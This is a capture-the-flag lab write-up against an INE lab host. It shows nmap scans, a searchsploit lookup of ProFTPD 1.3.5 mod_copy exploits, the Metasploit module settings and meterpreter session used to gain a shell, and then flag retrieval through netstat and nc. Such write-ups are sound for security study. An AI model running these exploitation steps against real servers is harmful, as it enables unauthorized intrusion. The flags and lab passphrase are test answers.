# Enumeration 
## nmap scan
### port scan
```shell
sudo nmap --min-rate 10000 -p- -sV target1.ine.local
	
	21/tcp open  ftp     ProFTPD 1.3.5
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
### service scan
```shell
sudo nmap -sS -sV -A -T4 -p21,80 -oX target1 target1.ine.local
	
	21/tcp open  ftp     ProFTPD 1.3.5
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.41 (Ubuntu)
```

# Exploitation
## searchsploit
```shell
# searchsploit ProFTPD 1.3.5
searchsploit ProFTPD 1.3.5 -j | jq | grep -E 'Title|Path'                                                                                              
      "Title": "ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/37262.rb"
     
	  "Title": "ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/49908.py"
      
      "Title": "ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/36803.py"
      
      "Title": "ProFTPd 1.3.5 - File Copy",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/36742.txt"

```
as metasploit exploit found so use it
## Proftpd Exploitation
```shell
# Search for the specific exploit
search proftpd 1.3.5
setg RHOSTS target1.ine.local
use 0
show options
set LHOST 192.88.136.2
set SITEPATH /var/www/html
run
sessions

# upgrade to meterpreter session
sessions -u 1

# session
meterpreter > cd /
meterpreter > cat flag1.txt
FLAG1{b1a6da7e42bd41c09111c2878d0ea576}
Remember, the magical word is 'letmein'
```

# Post-Exploitation
## root access
```shell
# network enum
netstat -puntl
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
	tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
	tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
	tcp        0      0 127.0.0.11:44627        0.0.0.0:*               LISTEN      -                   
	udp        0      0 127.0.0.11:37270        0.0.0.0:*                           -                

# notices 8888 has something listing so check with nc which is intalled
nc 127.0.0.1 8888
	# used that hint letmein  
	Enter the secret passphrase: letmein
	FLAG2{84a89b91e2f945fca121bfebaf56d4c4}
```